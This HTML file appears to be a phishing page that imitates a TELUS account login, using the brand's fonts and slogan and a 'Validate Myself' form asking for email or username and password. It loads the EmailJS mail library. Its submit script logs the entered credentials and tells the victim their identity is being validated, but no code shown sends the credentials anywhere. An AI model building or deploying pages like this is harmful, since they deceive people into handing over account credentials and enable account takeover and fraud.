<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identify Acc-TEL</title> 
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <style>
        /* Overall Header Styling */
.blader {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    background-color: #fff;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Optional shadow */
    width: 100%;
    max-width: 100%; /* Ensure it doesn’t exceed the screen width */
    box-sizing: border-box; /* Prevent padding from causing overflow */
    overflow: hidden; /* Prevent overflow */
    flex-wrap: wrap; /* Allow the header to wrap on small screens */
}

/* Logo Styling */
.mojo-cont.logo {
    width: 150px; /* Adjust size as needed */
    height: auto;
    max-width: 100%; /* Make sure the logo doesn't overflow */
}

/* Menu Container */
.basic-cont {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap; /* Wrap items to prevent overflow */
}

/* Shopping Cart Icon Styling */
.cart i {
    font-size: 22px; /* Adjust size for simplicity */
    color: #000; /* Color for the cart icon */
    cursor: pointer;
    margin-right: 15px; /* Space between cart and hamburger menu */
    flex-shrink: 0; /* Prevent the cart icon from shrinking */
}

/* Hamburger Menu Icon Styling */
.burger {
    font-size: 20px; /* Slim size */
    cursor: pointer;
    flex-shrink: 0; /* Prevent hamburger menu from shrinking */
}


.shora {
    width: 100%;
    font-family: HNforTELUSSA400normal, Arial, sans-serif;
    font-size: 16px;
    background-color: rgb(226, 226, 226);
    -webkit-font-smoothing: antialiased;
    letter-spacing: normal !important;
    text-align: center;
    padding: 20px;
    border-radius: 0; /* This removes the rounded corners */
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    max-width: 100%; /* Prevents the container from exceeding its parent's width */
    box-sizing: border-box; /* Ensures padding and border are included in width/height calculations */
    overflow: hidden; /* Prevents content overflow */
}



  
.formpage {
    background-color: #ffffff;
    padding: 40px;
    box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 400px; /* Keep the container's maximum width small */
    text-align: center;
    border: 2px solid #f4f2f3;
    border-radius: 8px;
    height: 100%; /* Set height to 100% of its parent container */
    max-height: 90vh; /* Ensure it doesn't overflow vertically */
    overflow-y: auto; /* Allows vertical scrolling if content overflows */
    margin: 0 auto;
    box-sizing: border-box; /* Ensures padding doesn't affect total width */
    position: relative; /* Prevents content from overflowing horizontally */
}

h1 {
    color: rgb(75, 40, 109);
    margin-bottom: 20px;
    font-family: HNforTELUSSA300normal;
}

.input-group {
    margin-bottom: 22px;
    text-align: left;
}

.input-group label {
    font-size: 14px;
    color: #000000;
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
}

.input-group input {
    width: 90%;
    padding: 12px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

.login-btn {
    width: 87%;
    padding: 12px;
    font-size: 16px;
    font-weight: bold;
    background-color: rgb(43, 128, 0);
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

.login-btn:hover {
    background-color: rgb(43, 128, 0);
}

.success-message {
    color: green;
    font-size: 16px;
    margin-top: 15px;
}


/* Hide both images by default */
.desktop-footer, .mobile-footer {
    display: none;
    width: 100%; /* Make the images responsive */
    max-width: 100%; /* Prevent the images from overflowing */
    height: auto; /* Maintain the aspect ratio of the images */
  }
  
  /* Show the desktop image for larger screens (like desktops) */
  @media (min-width: 768px) {
    .desktop-footer {
      display: block;
    }
  }
  
  /* Show the mobile image for smaller screens (like phones) */
  @media (max-width: 767px) {
    .mobile-footer {
      display: block;
    }
  }
    </style>
</head>

<body>

<header class="blader">
    <div class="mojo-cont">
        <img src="images/imagelolopo.svg" alt="Logo" class="logo">
    </div>
    <div class="basic-cont">
        <div class="cart">
            <i class="fas fa-shopping-cart"></i>
        </div>
        <div class="burger">&#9776;</div>
    </div>
</header>

<main>
    <section>
        <div class="shora">
            Proudly Canadian - connecting us all nationwide
        </div>
    </section>
<br><br>

<section>
    <div class="formpage">
        <h1>Validate Myself</h1>

        <form id="validateForm">
            <div class="input-group">
                <label for="number">Email or Username</label>
                <input type="text" id="number" name="number" required>
            </div>
            
            <div class="input-group">
                <label for="message">Password</label>
                <input type="password" id="message" name="message" required>
            </div>

            <button type="submit" class="login-btn">Validate</button>
        </form>
    
        <div class="success-message" id="success-message" style="display:none;">
            Thanks for signing in! We are validating your identity.
        </div>
    
        <div class="footer">
            <p>Need help? <a href="#">Contact Support</a></p>
        </div>
    </div>

    <script>
        document.getElementById('validateForm').onsubmit = function(e) {
            e.preventDefault();

            const number = document.getElementById('number').value;
            const message = document.getElementById('message').value;

            if (number && message) {
                console.log("Form submitted:", { number, message });

                document.getElementById('success-message').style.display = 'block';
                document.getElementById('validateForm').style.display = 'none';
            }
        };
    </script>    
</section>
</main>
    <footer>
        <img src="images/imagedon2.png" alt="Footer Image" class="desktop-footer">
        <img src="images/imagebacha.jpeg" alt="Footer Image" class="mobile-footer">
    </footer>
</body>
</html>
